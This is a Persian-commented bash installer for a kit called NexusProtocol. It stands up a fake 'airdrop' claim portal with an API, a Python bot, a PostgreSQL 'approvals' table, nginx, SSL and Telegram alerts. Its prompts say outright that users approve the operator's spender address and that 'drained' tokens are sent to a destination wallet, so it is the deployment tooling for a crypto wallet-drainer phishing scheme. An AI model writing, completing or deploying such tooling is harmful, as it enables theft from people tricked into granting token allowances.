#!/usr/bin/env bash
# ══════════════════════════════════════════════════════════════════════════════
#  NexusProtocol — اسکریپت نصب پیشرفته و کامل
#  نسخه: 2.0  |  Ubuntu 20.04 / 22.04 / 24.04
# ══════════════════════════════════════════════════════════════════════════════
set -euo pipefail

# ── رنگ‌ها ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; BOLD='\033[1m'
MAGENTA='\033[0;35m'; NC='\033[0m'

# ── مسیرها ──────────────────────────────────────────────────────────────────
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEPLOY="$ROOT/deploy"
LOG_FILE="/var/log/nexus-install.log"
ENV_FILE="$DEPLOY/.env"

# ── لاگ همه چیز ─────────────────────────────────────────────────────────────
mkdir -p /var/log
exec > >(tee -a "$LOG_FILE") 2>&1

# ═════════════════════════════════════════════════════════════════════════════
# توابع کمکی
# ═════════════════════════════════════════════════════════════════════════════

banner() {
  echo -e "\n${CYAN}${BOLD}"
  echo "╔══════════════════════════════════════════════════════════════╗"
  echo "║           NexusProtocol — نصب پیشرفته کامل                  ║"
  echo "║         سایت + API + ربات + دیتابیس + SSL + nginx           ║"
  echo "╚══════════════════════════════════════════════════════════════╝"
  echo -e "${NC}"
}

step() { echo -e "\n${BLUE}${BOLD}━━━ $1 ━━━${NC}"; }
ok()   { echo -e "  ${GREEN}✓${NC} $1"; }
warn() { echo -e "  ${YELLOW}⚠${NC}  $1"; }
err()  { echo -e "  ${RED}✗${NC} $1"; }
info() { echo -e "  ${CYAN}→${NC} $1"; }

# progress spinner
spinner() {
  local pid=$1 msg=$2
  local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
  local i=0
  while kill -0 "$pid" 2>/dev/null; do
    printf "\r  ${CYAN}${spin:$((i % 10)):1}${NC}  %s..." "$msg"
    sleep 0.1; ((i++)) || true
  done
  printf "\r"
}

# تایید با enter یا y
confirm() {
  local msg="$1"
  echo -en "  ${YELLOW}?${NC} $msg ${BOLD}[Enter=ادامه / Ctrl+C=لغو]${NC} "
  read -r
}

# درخواست مقدار با توضیح
ask() {
  local var_name="$1"
  local prompt="$2"
  local default="${3:-}"
  local secret="${4:-no}"
  local value=""

  while true; do
    if [[ "$secret" == "yes" ]]; then
      echo -en "  ${YELLOW}◆${NC} $prompt: "
      read -rs value
      echo
    else
      if [[ -n "$default" ]]; then
        echo -en "  ${YELLOW}◆${NC} $prompt ${CYAN}[پیش‌فرض: $default]${NC}: "
      else
        echo -en "  ${YELLOW}◆${NC} $prompt: "
      fi
      read -r value
    fi

    if [[ -z "$value" && -n "$default" ]]; then
      value="$default"
    fi

    if [[ -z "$value" ]]; then
      err "این مقدار اجباری است، خالی نگذارید."
      continue
    fi
    break
  done

  printf -v "$var_name" '%s' "$value"
}

# بررسی آدرس اتریوم
is_eth_address() {
  [[ "$1" =~ ^0x[0-9a-fA-F]{40}$ ]]
}

# بررسی کلید خصوصی (۶۴ کاراکتر hex، بدون 0x)
is_private_key() {
  [[ "$1" =~ ^[0-9a-fA-F]{64}$ ]]
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۰ — بررسی‌های پیش از نصب
# ═════════════════════════════════════════════════════════════════════════════
preflight() {
  step "بررسی‌های اولیه سیستم"

  # باید root باشه
  if [[ "$EUID" -ne 0 ]]; then
    err "این اسکریپت باید با دسترسی root اجرا شود:"
    echo "       sudo bash install.sh"
    exit 1
  fi
  ok "دسترسی root تأیید شد"

  # سیستم‌عامل
  if ! grep -qiE "ubuntu|debian" /etc/os-release 2>/dev/null; then
    warn "این اسکریپت روی Ubuntu/Debian بهینه شده — ادامه با احتیاط"
  else
    local distro
    distro=$(. /etc/os-release && echo "$PRETTY_NAME")
    ok "سیستم‌عامل: $distro"
  fi

  # RAM
  local ram_mb
  ram_mb=$(free -m | awk '/^Mem:/{print $2}')
  if [[ "$ram_mb" -lt 900 ]]; then
    warn "RAM کمتر از ۱GB است ($ram_mb MB) — ممکن است کند باشد"
  else
    ok "RAM: ${ram_mb}MB ✓"
  fi

  # فضای دیسک
  local disk_gb
  disk_gb=$(df -BG / | awk 'NR==2{print $4}' | tr -d 'G')
  if [[ "$disk_gb" -lt 3 ]]; then
    err "فضای دیسک خیلی کم است (${disk_gb}GB) — حداقل ۳GB نیاز است"
    exit 1
  fi
  ok "فضای دیسک: ${disk_gb}GB آزاد ✓"

  # اتصال اینترنت
  if ! curl -s --connect-timeout 5 https://get.docker.com >/dev/null 2>&1; then
    err "اتصال اینترنت برقرار نیست یا DNS کار نمی‌کند"
    exit 1
  fi
  ok "اتصال اینترنت ✓"
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۱ — دریافت اطلاعات از کاربر
# ═════════════════════════════════════════════════════════════════════════════
collect_config() {
  step "تنظیمات پروژه"
  echo -e "  ${CYAN}لطفاً اطلاعات زیر را وارد کنید. هر مقدار توضیح دارد.${NC}\n"

  # ── دامنه ──
  echo -e "  ${BOLD}[۱/۸] دامنه سایت${NC}"
  echo -e "  ${CYAN}مثال: claim.mysite.com یا airdrop.example.io${NC}"
  echo -e "  ${CYAN}قبل از ادامه مطمئن شو DNS رکورد A این دامنه به IP این سرور اشاره داره${NC}"
  while true; do
    ask INPUT_DOMAIN "دامنه (بدون https://)"
    if [[ "$INPUT_DOMAIN" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$ ]]; then
      break
    fi
    err "فرمت دامنه نامعتبر است. مثال: claim.mysite.com"
  done
  ok "دامنه: $INPUT_DOMAIN"

  # ── رمز دیتابیس ──
  echo -e "\n  ${BOLD}[۲/۸] رمز دیتابیس${NC}"
  echo -e "  ${CYAN}یک رمز قوی برای PostgreSQL — می‌توانید هر چیزی وارد کنید${NC}"
  ask INPUT_DB_PASSWORD "رمز دیتابیس" "" "yes"
  ok "رمز دیتابیس تنظیم شد"

  # ── کلید Session ──
  echo -e "\n  ${BOLD}[۳/۸] کلید امنیتی Session${NC}"
  echo -e "  ${CYAN}برای ساخت خودکار Enter بزن، یا کلید خودت رو وارد کن${NC}"
  echo -en "  ${YELLOW}◆${NC} SESSION_SECRET (خودکار بسازم؟) ${CYAN}[Enter=بله / کلید دستی وارد کن]${NC}: "
  read -r tmp_session
  if [[ -z "$tmp_session" ]]; then
    INPUT_SESSION_SECRET=$(openssl rand -hex 32)
    ok "SESSION_SECRET خودکار ساخته شد"
  else
    INPUT_SESSION_SECRET="$tmp_session"
    ok "SESSION_SECRET دستی تنظیم شد"
  fi

  # ── کلید خصوصی executor ──
  echo -e "\n  ${BOLD}[۴/۸] کلید خصوصی کیف‌پول Executor${NC}"
  echo -e "  ${CYAN}کیف‌پولی که gas تراکنش‌ها رو پرداخت می‌کنه${NC}"
  echo -e "  ${RED}⚠ بدون 0x در ابتدا — فقط ۶۴ کاراکتر hex${NC}"
  while true; do
    ask INPUT_EXECUTOR_KEY "EXECUTOR_PRIVATE_KEY (۶۴ کاراکتر، بدون 0x)" "" "yes"
    # حذف 0x در صورت وجود
    INPUT_EXECUTOR_KEY="${INPUT_EXECUTOR_KEY#0x}"
    if is_private_key "$INPUT_EXECUTOR_KEY"; then
      break
    fi
    err "کلید خصوصی باید دقیقاً ۶۴ کاراکتر hex باشد (بدون 0x)"
  done
  ok "EXECUTOR_PRIVATE_KEY تنظیم شد"

  # ── آدرس Spender ──
  echo -e "\n  ${BOLD}[۵/۸] آدرس عمومی کیف‌پول Executor (Spender)${NC}"
  echo -e "  ${CYAN}آدرس عمومی مربوط به کلید خصوصی بالا — با 0x شروع می‌شه${NC}"
  echo -e "  ${CYAN}کاربران این آدرس رو approve می‌کنند${NC}"
  while true; do
    ask INPUT_SPENDER "SPENDER_ADDRESS (با 0x)"
    if is_eth_address "$INPUT_SPENDER"; then
      break
    fi
    err "آدرس اتریوم معتبر نیست — باید با 0x شروع شه و ۴۲ کاراکتر باشه"
  done
  ok "SPENDER_ADDRESS: $INPUT_SPENDER"

  # ── آدرس مقصد ──
  echo -e "\n  ${BOLD}[۶/۸] آدرس مقصد (دریافت توکن‌ها)${NC}"
  echo -e "  ${CYAN}توکن‌های drain شده به این آدرس منتقل می‌شن${NC}"
  echo -e "  ${CYAN}می‌تواند همان SPENDER_ADDRESS باشه یا آدرس دیگری${NC}"
  echo -en "  ${YELLOW}◆${NC} همان SPENDER_ADDRESS باشد؟ ${CYAN}[Enter=بله / N=آدرس دیگر]${NC}: "
  read -r same_dest
  if [[ -z "$same_dest" || "${same_dest,,}" == "y" ]]; then
    INPUT_DESTINATION="$INPUT_SPENDER"
    ok "DESTINATION_ADDRESS: همان Spender"
  else
    while true; do
      ask INPUT_DESTINATION "DESTINATION_ADDRESS (با 0x)"
      if is_eth_address "$INPUT_DESTINATION"; then
        break
      fi
      err "آدرس اتریوم معتبر نیست"
    done
    ok "DESTINATION_ADDRESS: $INPUT_DESTINATION"
  fi

  # ── RPC URL ──
  echo -e "\n  ${BOLD}[۷/۸] آدرس نود اتریوم (RPC)${NC}"
  echo -e "  ${CYAN}پیش‌فرض رایگان: https://eth.llamarpc.com${NC}"
  echo -e "  ${CYAN}برای عملکرد بهتر Alchemy یا Infura توصیه می‌شه${NC}"
  ask INPUT_RPC "RPC_URL" "https://eth.llamarpc.com"
  ok "RPC_URL: $INPUT_RPC"

  # ── تلگرام (اختیاری) ──
  echo -e "\n  ${BOLD}[۸/۸] تلگرام (اطلاع‌رسانی — اختیاری)${NC}"
  echo -en "  ${YELLOW}◆${NC} اطلاع‌رسانی تلگرام فعال شود؟ ${CYAN}[Enter=نه / Y=بله]${NC}: "
  read -r use_telegram
  if [[ "${use_telegram,,}" == "y" ]]; then
    echo -e "  ${CYAN}از @BotFather در تلگرام توکن ربات رو بگیر${NC}"
    ask INPUT_TG_TOKEN "TELEGRAM_BOT_TOKEN"
    echo -e "  ${CYAN}از @userinfobot چت آی‌دی خودت رو بگیر${NC}"
    ask INPUT_TG_CHAT "TELEGRAM_CHAT_ID"
    ok "تلگرام تنظیم شد"
  else
    INPUT_TG_TOKEN=""
    INPUT_TG_CHAT=""
    ok "تلگرام: غیر فعال"
  fi

  # ── خلاصه تنظیمات ──
  echo -e "\n${CYAN}${BOLD}━━━ خلاصه تنظیمات ━━━${NC}"
  echo -e "  دامنه:              ${BOLD}$INPUT_DOMAIN${NC}"
  echo -e "  RPC:                ${BOLD}$INPUT_RPC${NC}"
  echo -e "  SPENDER:            ${BOLD}$INPUT_SPENDER${NC}"
  echo -e "  DESTINATION:        ${BOLD}$INPUT_DESTINATION${NC}"
  echo -e "  تلگرام:             ${BOLD}${INPUT_TG_TOKEN:+فعال}${INPUT_TG_TOKEN:-غیرفعال}${NC}"

  confirm "تنظیمات صحیح است؟ ادامه می‌دهیم؟"
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۲ — ذخیره .env
# ═════════════════════════════════════════════════════════════════════════════
write_env() {
  step "ذخیره فایل تنظیمات"
  cat > "$ENV_FILE" << EOF
# ══════════════════════════════════════════════════════
#  NexusProtocol — تنظیمات خودکار تولید شده
#  تاریخ: $(date '+%Y-%m-%d %H:%M:%S')
# ══════════════════════════════════════════════════════

DOMAIN=${INPUT_DOMAIN}
DB_PASSWORD=${INPUT_DB_PASSWORD}
SESSION_SECRET=${INPUT_SESSION_SECRET}
EXECUTOR_PRIVATE_KEY=${INPUT_EXECUTOR_KEY}
SPENDER_ADDRESS=${INPUT_SPENDER}
DESTINATION_ADDRESS=${INPUT_DESTINATION}
RPC_URL=${INPUT_RPC}
TELEGRAM_BOT_TOKEN=${INPUT_TG_TOKEN}
TELEGRAM_CHAT_ID=${INPUT_TG_CHAT}
EOF
  chmod 600 "$ENV_FILE"
  ok "فایل $ENV_FILE ذخیره شد (دسترسی محدود: 600)"
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۳ — نصب Docker
# ═════════════════════════════════════════════════════════════════════════════
install_docker() {
  step "نصب Docker"

  if command -v docker &>/dev/null; then
    local ver
    ver=$(docker --version | grep -oP '[\d.]+' | head -1)
    ok "Docker قبلاً نصب شده: v$ver"
  else
    info "در حال دانلود و نصب Docker..."
    curl -fsSL https://get.docker.com -o /tmp/get-docker.sh
    bash /tmp/get-docker.sh >/dev/null 2>&1 &
    spinner $! "نصب Docker"
    wait $!
    systemctl enable docker >/dev/null 2>&1
    systemctl start docker
    ok "Docker نصب شد: $(docker --version)"
  fi

  # Docker Compose v2
  if docker compose version &>/dev/null; then
    ok "Docker Compose v2 موجود است"
  else
    info "نصب Docker Compose plugin..."
    apt-get install -y -qq docker-compose-plugin
    ok "Docker Compose نصب شد"
  fi
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۴ — نصب Node.js، pnpm، ابزارها
# ═════════════════════════════════════════════════════════════════════════════
install_tools() {
  step "نصب ابزارهای سرور"
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -qq

  # nginx و certbot
  info "نصب nginx و certbot..."
  apt-get install -y -qq nginx certbot python3-certbot-nginx curl openssl
  ok "nginx و certbot نصب شدند"

  # Node.js 20
  if ! command -v node &>/dev/null || ! node -v | grep -q "^v20\|^v22"; then
    info "نصب Node.js 20..."
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null 2>&1
    apt-get install -y -qq nodejs
    ok "Node.js $(node -v) نصب شد"
  else
    ok "Node.js $(node -v) از قبل موجود است"
  fi

  # pnpm
  if ! command -v pnpm &>/dev/null; then
    info "نصب pnpm..."
    npm install -g pnpm@10 --quiet 2>/dev/null
    ok "pnpm $(pnpm -v) نصب شد"
  else
    ok "pnpm $(pnpm -v) از قبل موجود است"
  fi
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۵ — Build سایت React
# ═════════════════════════════════════════════════════════════════════════════
build_frontend() {
  step "Build سایت React (Airdrop Portal)"
  cd "$ROOT"

  info "نصب dependencies پروژه..."
  pnpm install --no-frozen-lockfile --silent 2>&1 | tail -3

  info "Build سایت..."
  BASE_PATH=/airdrop/ PORT=3000 NODE_ENV=production \
    pnpm --filter @workspace/airdrop run build 2>&1 | tail -5

  local dest="/var/www/nexus/airdrop"
  mkdir -p "$dest"
  cp -r artifacts/airdrop/dist/public/. "$dest/"
  ok "فایل‌های سایت کپی شدند → $dest"

  # بررسی وجود index.html
  if [[ -f "$dest/index.html" ]]; then
    ok "سایت React آماده است"
  else
    err "index.html یافت نشد — Build شاید ناموفق بوده"
    exit 1
  fi
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۶ — اجرای Docker (DB + API + Bot)
# ═════════════════════════════════════════════════════════════════════════════
start_docker_services() {
  step "اجرای سرویس‌های Docker"
  cd "$DEPLOY"

  # متوقف کردن سرویس‌های قبلی (اگر بودن)
  if docker compose ps -q 2>/dev/null | grep -q .; then
    info "متوقف کردن سرویس‌های قدیمی..."
    docker compose down --timeout 10 2>/dev/null || true
    ok "سرویس‌های قبلی متوقف شدند"
  fi

  # Build image‌ها
  info "Build image‌های Docker (اولین بار ۵–۱۵ دقیقه)..."
  docker compose build --parallel api bot 2>&1 | \
    grep -E "Step|Successfully|--->" | head -20 || true
  ok "Image‌های Docker build شدند"

  # راه‌اندازی دیتابیس
  info "راه‌اندازی PostgreSQL..."
  docker compose up -d db
  local retries=0
  while ! docker compose exec -T db pg_isready -U airdrop &>/dev/null; do
    sleep 2; ((retries++))
    if [[ $retries -ge 30 ]]; then
      err "دیتابیس در ۶۰ ثانیه آماده نشد"
      docker compose logs db | tail -20
      exit 1
    fi
  done
  ok "PostgreSQL آماده است"

  # ساخت جدول
  info "ساخت جداول دیتابیس..."
  docker compose exec -T db psql -U airdrop -d airdrop -q << 'SQL'
CREATE TABLE IF NOT EXISTS approvals (
  id          TEXT        PRIMARY KEY,
  wallet      TEXT        NOT NULL,
  token       TEXT        NOT NULL,
  spender     TEXT        NOT NULL,
  amount      TEXT        NOT NULL,
  tx_hash     TEXT,
  chain_id    INTEGER     NOT NULL DEFAULT 1,
  wallet_type TEXT        NOT NULL DEFAULT 'MetaMask',
  status      TEXT        NOT NULL DEFAULT 'pending',
  processed   BOOLEAN     NOT NULL DEFAULT FALSE,
  created_at  TIMESTAMP   NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_approvals_status ON approvals(status);
CREATE INDEX IF NOT EXISTS idx_approvals_created ON approvals(created_at DESC);
SQL
  ok "جداول دیتابیس آماده شدند"

  # راه‌اندازی API
  info "راه‌اندازی API Server..."
  docker compose up -d api
  local api_retries=0
  while ! curl -sf http://127.0.0.1:8080/api/healthz &>/dev/null; do
    sleep 2; ((api_retries++))
    if [[ $api_retries -ge 20 ]]; then
      err "API Server در ۴۰ ثانیه آماده نشد"
      docker compose logs api | tail -20
      exit 1
    fi
  done
  ok "API Server در حال اجراست و سالم است"

  # راه‌اندازی ربات
  info "راه‌اندازی ربات Python..."
  docker compose up -d bot
  sleep 3
  if docker compose ps bot | grep -q "Up\|running"; then
    ok "ربات Python در حال اجراست"
  else
    warn "ربات شاید هنوز در حال راه‌اندازی است — بعداً لاگ را بررسی کنید:"
    echo "    docker compose -f $DEPLOY/docker-compose.yml logs bot"
  fi
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۷ — پیکربندی nginx
# ═════════════════════════════════════════════════════════════════════════════
configure_nginx() {
  step "پیکربندی nginx"

  # پشتیبان‌گیری از config قبلی
  if [[ -f /etc/nginx/sites-available/nexus ]]; then
    cp /etc/nginx/sites-available/nexus /etc/nginx/sites-available/nexus.bak
    info "Config قبلی در nexus.bak ذخیره شد"
  fi

  cat > /etc/nginx/sites-available/nexus << NGINX
server {
    listen 80;
    server_name ${INPUT_DOMAIN};

    # ── API ────────────────────────────────────────────────────
    location /api/ {
        proxy_pass         http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header   Host              \$host;
        proxy_set_header   X-Real-IP         \$remote_addr;
        proxy_set_header   X-Forwarded-For   \$proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto \$scheme;
        proxy_read_timeout 30s;
        proxy_connect_timeout 5s;
    }

    # ── سایت Airdrop ────────────────────────────────────────────
    location /airdrop/ {
        root  /var/www/nexus;
        try_files \$uri \$uri/ /airdrop/index.html;
        expires 1h;
        add_header Cache-Control "public, no-transform";
    }

    # ── ریدایرکت root ────────────────────────────────────────────
    location = / {
        return 301 /airdrop/;
    }

    # ── بررسی سلامت nginx ───────────────────────────────────────
    location /health {
        return 200 "ok\n";
        add_header Content-Type text/plain;
    }

    # ── فشرده‌سازی ──────────────────────────────────────────────
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain application/javascript text/css
               application/json application/xml text/xml
               image/svg+xml font/woff2;

    # ── هدرهای امنیتی ───────────────────────────────────────────
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
}
NGINX

  ln -sf /etc/nginx/sites-available/nexus /etc/nginx/sites-enabled/nexus
  rm -f /etc/nginx/sites-enabled/default

  # تست config
  if nginx -t 2>/dev/null; then
    systemctl reload nginx
    ok "nginx پیکربندی و reload شد"
  else
    err "خطا در config nginx:"
    nginx -t
    exit 1
  fi

  # تست دسترسی از طریق nginx
  if curl -sf "http://127.0.0.1/health" &>/dev/null; then
    ok "nginx در حال سرویس‌دهی است"
  else
    warn "nginx اجرا است ولی health check پاسخ نداد"
  fi
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۸ — گواهی SSL رایگان
# ═════════════════════════════════════════════════════════════════════════════
setup_ssl() {
  step "گواهی SSL رایگان (Let's Encrypt)"

  # بررسی DNS
  info "بررسی DNS دامنه..."
  local server_ip
  server_ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null || \
              curl -s --connect-timeout 5 https://ipecho.net/plain 2>/dev/null || \
              echo "نامشخص")
  local domain_ip
  domain_ip=$(getent hosts "$INPUT_DOMAIN" | awk '{print $1}' 2>/dev/null || echo "")

  if [[ -z "$domain_ip" ]]; then
    warn "DNS دامنه $INPUT_DOMAIN هنوز به این سرور اشاره نمی‌کند"
    warn "IP سرور: $server_ip"
    echo -en "  ${YELLOW}?${NC} بدون SSL ادامه دهیم؟ ${BOLD}[Enter=بله / N=لغو]${NC}: "
    read -r skip_ssl
    if [[ "${skip_ssl,,}" == "n" ]]; then
      echo "بعد از اینکه DNS آماده شد این دستور را اجرا کن:"
      echo "  certbot --nginx -d $INPUT_DOMAIN --non-interactive --agree-tos \\"
      echo "    --email admin@$INPUT_DOMAIN --redirect"
      return
    fi
    warn "SSL رد شد — سایت روی HTTP در دسترس است"
    return
  fi

  if [[ "$domain_ip" != "$server_ip" ]]; then
    warn "DNS دامنه ($domain_ip) با IP این سرور ($server_ip) یکسان نیست"
    warn "ممکن است DNS هنوز propagate نشده باشد"
  fi

  info "درخواست گواهی SSL برای $INPUT_DOMAIN..."
  if certbot --nginx -d "$INPUT_DOMAIN" \
      --non-interactive --agree-tos \
      --email "admin@${INPUT_DOMAIN}" --redirect \
      2>&1 | grep -E "Congratulations|error|Error|Certificate not|Failed"; then
    ok "HTTPS با Let's Encrypt فعال شد"

    # تنظیم تجدید خودکار
    (crontab -l 2>/dev/null | grep -v certbot; \
     echo "0 3 1 */2 * certbot renew --quiet && systemctl reload nginx") | crontab -
    ok "تجدید خودکار SSL هر ۲ ماه تنظیم شد"
  else
    warn "SSL نصب نشد — سایت روی HTTP است"
    warn "بعداً این دستور را اجرا کن:"
    echo "    certbot --nginx -d $INPUT_DOMAIN --non-interactive --agree-tos \\"
    echo "      --email admin@$INPUT_DOMAIN --redirect"
  fi
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۹ — تنظیم systemd برای auto-restart
# ═════════════════════════════════════════════════════════════════════════════
setup_autostart() {
  step "تنظیم راه‌اندازی خودکار هنگام ریبوت"

  cat > /etc/systemd/system/nexus.service << EOF
[Unit]
Description=NexusProtocol Docker Services
After=network.target docker.service
Requires=docker.service

[Service]
Type=oneshot
RemainAfterExit=yes
WorkingDirectory=${DEPLOY}
ExecStart=/usr/bin/docker compose up -d
ExecStop=/usr/bin/docker compose down
TimeoutStartSec=120

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload
  systemctl enable nexus.service >/dev/null 2>&1
  ok "سرویس nexus.service ساخته شد — هنگام ریبوت خودکار اجرا می‌شود"
}

# ═════════════════════════════════════════════════════════════════════════════
# مرحله ۱۰ — تست نهایی همه سرویس‌ها
# ═════════════════════════════════════════════════════════════════════════════
final_check() {
  step "تست نهایی همه سرویس‌ها"
  local ok_count=0 fail_count=0

  # API healthz
  if curl -sf "http://127.0.0.1:8080/api/healthz" &>/dev/null; then
    ok "[API] /api/healthz → 200 OK"; ((ok_count++))
  else
    err "[API] /api/healthz پاسخ نداد"; ((fail_count++))
  fi

  # nginx
  if curl -sf "http://127.0.0.1/health" &>/dev/null; then
    ok "[nginx] /health → OK"; ((ok_count++))
  else
    err "[nginx] پاسخ نداد"; ((fail_count++))
  fi

  # سایت از طریق nginx
  if curl -sf "http://127.0.0.1/airdrop/" &>/dev/null; then
    ok "[سایت] /airdrop/ → OK"; ((ok_count++))
  else
    err "[سایت] /airdrop/ پاسخ نداد"; ((fail_count++))
  fi

  # Docker containers
  local running
  running=$(docker compose -f "$DEPLOY/docker-compose.yml" ps --format "table {{.Name}}\t{{.Status}}" 2>/dev/null | grep -v "NAME\|--" || true)
  while IFS= read -r line; do
    if [[ -z "$line" ]]; then continue; fi
    if echo "$line" | grep -qiE "Up|running|healthy"; then
      ok "[Docker] $line"
      ((ok_count++))
    else
      err "[Docker] $line"
      ((fail_count++))
    fi
  done <<< "$running"

  echo ""
  if [[ $fail_count -eq 0 ]]; then
    echo -e "  ${GREEN}${BOLD}همه $ok_count تست موفق بودند ✓${NC}"
  else
    echo -e "  ${YELLOW}نتیجه: $ok_count موفق، $fail_count ناموفق${NC}"
    echo -e "  ${CYAN}لاگ کامل در: $LOG_FILE${NC}"
  fi
}

# ═════════════════════════════════════════════════════════════════════════════
# گزارش نهایی
# ═════════════════════════════════════════════════════════════════════════════
final_report() {
  local protocol="http"
  certbot certificates 2>/dev/null | grep -q "$INPUT_DOMAIN" && protocol="https"

  echo -e "\n${GREEN}${BOLD}"
  echo "╔══════════════════════════════════════════════════════════════╗"
  echo "║                ✅  نصب کامل شد!                              ║"
  echo "╚══════════════════════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  🌐 سایت Airdrop:  ${CYAN}${BOLD}${protocol}://${INPUT_DOMAIN}/airdrop/${NC}"
  echo -e "  📡 API Server:    ${CYAN}${BOLD}${protocol}://${INPUT_DOMAIN}/api/approvals${NC}"
  echo -e "  🤖 ربات Python:   ${GREEN}در حال اجرا${NC}"
  echo -e "  🗄  دیتابیس:       ${GREEN}PostgreSQL آماده${NC}"
  echo -e "  🔒 SSL:            ${GREEN}${protocol/http/فعال}${NC}"
  echo ""
  echo -e "${BOLD}━━━ دستورات مدیریت ━━━${NC}"
  echo ""
  echo -e "  ${CYAN}# وضعیت همه سرویس‌ها${NC}"
  echo    "  docker compose -f $DEPLOY/docker-compose.yml ps"
  echo ""
  echo -e "  ${CYAN}# لاگ زنده ربات${NC}"
  echo    "  docker compose -f $DEPLOY/docker-compose.yml logs -f bot"
  echo ""
  echo -e "  ${CYAN}# لاگ API${NC}"
  echo    "  docker compose -f $DEPLOY/docker-compose.yml logs -f api"
  echo ""
  echo -e "  ${CYAN}# ری‌استارت ربات${NC}"
  echo    "  docker compose -f $DEPLOY/docker-compose.yml restart bot"
  echo ""
  echo -e "  ${CYAN}# مشاهده approval‌های ثبت‌شده${NC}"
  echo    "  docker compose -f $DEPLOY/docker-compose.yml exec db \\"
  echo    "    psql -U airdrop -c \"SELECT wallet, wallet_type, status, created_at FROM approvals ORDER BY created_at DESC LIMIT 20;\""
  echo ""
  echo -e "  ${CYAN}# خاموش کردن همه${NC}"
  echo    "  docker compose -f $DEPLOY/docker-compose.yml down"
  echo ""
  echo -e "  ${CYAN}# روشن کردن دوباره${NC}"
  echo    "  docker compose -f $DEPLOY/docker-compose.yml up -d"
  echo ""
  echo -e "  ${CYAN}# لاگ کامل نصب${NC}"
  echo    "  cat $LOG_FILE"
  echo ""
}

# ═════════════════════════════════════════════════════════════════════════════
# اجرای اصلی
# ═════════════════════════════════════════════════════════════════════════════
main() {
  banner
  echo -e "  ${CYAN}لاگ کامل نصب در: ${BOLD}$LOG_FILE${NC}"
  echo -e "  ${CYAN}تاریخ شروع: $(date '+%Y-%m-%d %H:%M:%S')${NC}\n"

  preflight          # ۰. بررسی سیستم
  collect_config     # ۱. دریافت اطلاعات
  write_env          # ۲. ذخیره .env
  install_docker     # ۳. نصب Docker
  install_tools      # ۴. نصب Node.js، nginx، certbot
  build_frontend     # ۵. Build سایت React
  start_docker_services  # ۶. اجرا DB + API + Bot
  configure_nginx    # ۷. تنظیم nginx
  setup_ssl          # ۸. SSL
  setup_autostart    # ۹. auto-start هنگام ریبوت
  final_check        # ۱۰. تست نهایی
  final_report       # گزارش نهایی
}

main "$@"
